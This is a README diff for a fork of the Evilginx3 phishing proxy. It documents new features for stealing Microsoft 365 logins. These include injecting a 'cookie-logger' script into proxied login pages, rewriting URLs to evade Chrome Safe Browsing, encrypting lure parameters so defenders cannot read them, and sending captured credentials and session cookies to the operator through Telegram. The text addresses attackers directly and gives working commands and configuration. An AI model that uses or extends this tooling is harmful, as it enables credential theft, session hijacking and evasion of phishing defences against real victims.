@@ -21,6 +21,11 @@
   * [EvilFeed Authentication](#evilfeed-authentication)
   * [Wildcard Certificate Support](#wildcard-certificate-support)
   * [IP Whitelist](#ip-whitelist)
+  * [New Features (v4.2)](#new-features-v42)
+    * [Phishlet V2 System](#phishlet-v2-system)
+    * [URL Rewriting (Safe Browsing Bypass)](#url-rewriting-safe-browsing-bypass)
+    * [Encrypted Custom Parameters](#encrypted-custom-parameters)
+    * [Telegram Notifications](#telegram-notifications)
   * [A Word About Phishlets](#a-word-about-phishlets)  
   * [A Word About The Evilginx3 Update](#a-word-about-the-evilginx3-update)
   * [Debugging & Troubleshooting](#debugging--troubleshooting)
@@ -269,6 +274,131 @@ In the `evilginx3` terminal:
 lures expose <id>
 ```
 This will update the "Active Lure URL" field in the EvilFeed settings tab.
+
+## New Features (v4.2)
+
+### Phishlet V2 System
+
+We have introduced a new, advanced phishlet system designed for better organization, stealth, and capability.
+
+#### How It Works
+The V2 system uses a **hybrid approach** to ensure maximum stability while enabling new features:
+1.  **Core Compatibility**: V2 phishlets are automatically converted to the legacy format internally, ensuring that the battle-tested proxying engine works flawlessly with them.
+2.  **Advanced Features**: New capabilities like static file injection and asset serving are handled directly by the V2 engine, giving you the best of both worlds.
+
+#### Directory Structure
+Instead of a single YAML file, V2 phishlets are self-contained directories. This allows you to bundle scripts, styles, and images directly with the phishlet.
+
+```
+phishlets_v2/
+└── microsoft365/              # Phishlet Name
+    ├── manifest.json5         # Main Configuration (JSON5 format)
+    ├── README.md              # Documentation
+    └── static/                # Static Files Directory
+        ├── scripts/           # JavaScript files to inject
+        │   ├── bot-bypass.js
+        │   └── cookie-logger.js
+        ├── styles/            # CSS files to inject
+        │   └── custom.css
+        └── assets/            # Images/Fonts to serve
+            └── logo.png
+```
+
+#### Using V2 Phishlets
+V2 phishlets are loaded automatically from the `phishlets_v2` directory.
+
+**Commands:**
+-   `phishletsv2 list`: List all available V2 phishlets.
+-   `phishletsv2 info <name>`: Show detailed information about a V2 phishlet.
+
+**Enabling:**
+You enable them just like normal phishlets:
+```bash
+phishlets hostname microsoft365 example.com
+phishlets enable microsoft365
+```
+*Note: If a V2 phishlet has the same name as a legacy YAML phishlet, the V2 phishlet takes precedence.*
+
+#### Creating V2 Phishlets
+1.  Create a directory in `phishlets_v2/` (e.g., `myphishlet`).
+2.  Create a `manifest.json5` file. This supports comments and trailing commas!
+3.  Define your configuration (similar to YAML but in JSON5).
+4.  Use the `static_files` section to inject JS/CSS:
+    ```json5
+    static_files: {
+      scripts: [
+        {
+          path: 'static/scripts/bypass.js',
+          inject_at: 'login.example.com',
+          inject_position: 'head_end',
+          inline: true
+        }
+      ]
+    }
+    ```
+
+### URL Rewriting (Safe Browsing Bypass)
+
+Bypass Google Chrome Safe Browsing and other scanners by rewriting URL paths and query parameters. This prevents pattern-based detection of your phishing links.
+
+**How It Works:**
+1.  **Rewrite**: Evilginx rewrites the incoming URL (e.g., `/signin?session=abc`) to the original target URL (e.g., `/oauth2/authorize?...`) internally.
+2.  **Transparent**: The victim sees the clean, rewritten URL, but the proxy communicates with the target using the correct URL.
+
+**Configuration:**
+Add `rewrite_urls` to your phishlet configuration (works in both YAML and V2 JSON5):
+
+```yaml
+rewrite_urls:
+  - trigger:
+      domains: ['login.microsoftonline.com']
+      paths: ['/common/oauth2/v2.0/authorize']
+    rewrite:
+      path: '/signin'
+      query:
+        - key: 'session'
+          value: '{id}'  # {id} is replaced with a random session ID
+      exclude_keys: ['client_id'] # Keep these keys from the original URL
+```
+
+**Result:**
+-   **Original**: `https://phish.com/common/oauth2/v2.0/authorize?client_id=123&scope=...`
+-   **Rewritten**: `https://phish.com/signin?session=<random_id>&client_id=123`
+
+### Encrypted Custom Parameters
+
+Protect your campaign from defenders who analyze phishing links. Instead of base64 encoding custom parameters (which can be easily decoded), you can now encrypt them using AES-GCM.
+
+**Setup:**
+1.  Set an encryption key in the terminal:
+    ```bash
+    config enc_key MySuperSecretKey123
+    ```
+2.  Generate your lure URL as usual:
+    ```bash
+    lures get-url <id> user=target@example.com
+    ```
+
+**Result:**
+The custom parameters (e.g., email) will be encrypted in the URL. Evilginx will automatically decrypt them when the victim clicks the link, so they are available for your phishlet logic.
+
+### Telegram Notifications
+
+Receive real-time notifications when credentials or sessions are captured, directly to your Telegram.
+
+**Setup:**
+1.  Create a Telegram bot via @BotFather.
+2.  Get your Chat ID.
+3.  Configure in terminal:
+    ```bash
+    config webhook_telegram <bot_token>/<chat_id>
+    ```
+    Example: `config webhook_telegram 123456:ABC-DEF/987654321`
+
+**Features:**
+-   Instant notification on credential capture.
+-   Session cookies are exported as a JSON file and sent as an attachment.
+-   Includes IP, User-Agent, and Lure information.
 
 ## A Word About Phishlets
 
